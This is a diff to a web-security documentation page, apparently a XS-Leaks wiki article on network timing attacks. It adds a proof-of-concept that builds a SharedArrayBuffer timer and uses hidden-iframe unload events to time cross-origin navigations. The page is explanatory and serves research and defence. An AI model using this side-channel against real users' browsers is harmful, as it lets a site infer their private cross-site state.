@@ -32,7 +32,6 @@ This side-channel allows attackers to infer information from a cross-site reques
 {{< hint tip >}}
 Learn more about the different types of clocks in the [Clocks Article]({{< ref "clocks.md" >}}).
 {{< /hint >}}
-
 ## Modern Web Timing Attacks
 
 The [performance.now()]({{< ref "clocks.md#performancenow" >}}) API can be used to measure how much time it takes to perform a request.
@@ -51,7 +50,6 @@ fetch('https://example.org', {
   console.log("The request took %d ms.", time);
 });
 ```
-
 ## Onload events
 
 A similar process can be used to measure how long it takes to fetch a resource by simply watching for an onload event.
@@ -71,7 +69,6 @@ script.onload = () => {
   console.log("The request took %d ms.", time)
 }
 ```
-
 {{< hint tip >}}
 A similar technique can be used for other HTML elements, e.g. `<img>`, `<link>`, `<iframe>` which could be used in scenarios where other techniques fail. For example, if [Fetch Metadata]({{< ref "/docs/defenses/opt-in/fetch-metadata.md">}}) blocked loading of a resource into a script tag it may allow it into an image tag.
 {{< /hint >}}
@@ -132,6 +129,65 @@ Note that this POC uses `setTimeout` in order to create the rough equivalent of 
 This technique can also be adapted to measure the Execution Timing of a page by [making the event loop busy]({{< ref "execution-timing.md#busy-event-loop" >}}).
 {{< /hint >}}
 
+## Network timing using the unload events with a SharedArrayBuffer
+The SharedArrayBuffer can be used to create a high-resolution timer however due to security conserns you need to set the following server headers:  
+```
+Cross-Origin-Embedder-Policy: "require-corp"  
+Cross-Origin-Opener-Policy: "same-origin"  
+```
+To enable cross origin isolation so there will be restrictions for cross origin requests.
+This example uses an iframe so no extra window will be needed however it still works even if the websites blocks the use of iframes.
+```javascript
+"use strict";
+
+var test = null;
+
+// Load worker directly
+function worker_function() {
+  "use strict";
+  self.onmessage = function(event) {
+    const sharedBuffer = event.data;
+    const sharedArray = new Uint32Array(sharedBuffer);
+    while (true) Atomics.add(sharedArray, 0, 1);
+  };
+}
+const worker = new Worker(URL.createObjectURL(new Blob(["(" + worker_function.toString() + ")()"], {type: "text/javascript"})));
+
+// Create buffer
+const sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
+const sharedArray = new Uint32Array(sharedBuffer);
+
+// Create iframe (does not matter if there blocked at the url)
+window.onload = function() {
+  worker.postMessage(sharedBuffer);
+  test = document.createElement("iframe");
+  test.setAttribute("hidden", true);
+  document.body.appendChild(test);
+  console.log("Ready");
+};
+
+async function getDuration(url) {
+  var start = 0;
+  test.src = "about:blank";
+  // Wait for blank page to load
+  await new Promise(resolve => (test.onload = resolve));
+  // Resolves on unload
+  return new Promise(resolve => {
+    // https://developers.google.com/web/updates/2018/07/page-lifecycle-api
+    test.contentWindow.onbeforeunload = _ => {
+       // Get time during navigation
+      start = Atomics.load(sharedArray, 0);
+    }
+    test.contentWindow.onunload = _ => {
+      // Get time after navigation
+      let time = Atomics.load(sharedArray, 0);
+      resolve(time - start);
+    };
+    // Go to target
+    test.src = url;
+  });
+}
+```
 ## Timeless Timing Attacks
 
 Other attacks do not consider the notion of time to perform a timing attack [^3]. Timeless attacks consist of fitting two `HTTP` requests in a single packet, the baseline and the attacked request, to guarantee they arrive at the same time to the server. The server *will* process the requests concurrently, and return a response based on their execution time as soon as possible. One of the two requests will arrive first, allowing the attacker to get the timing difference by comparing the order in which the requests arrived.
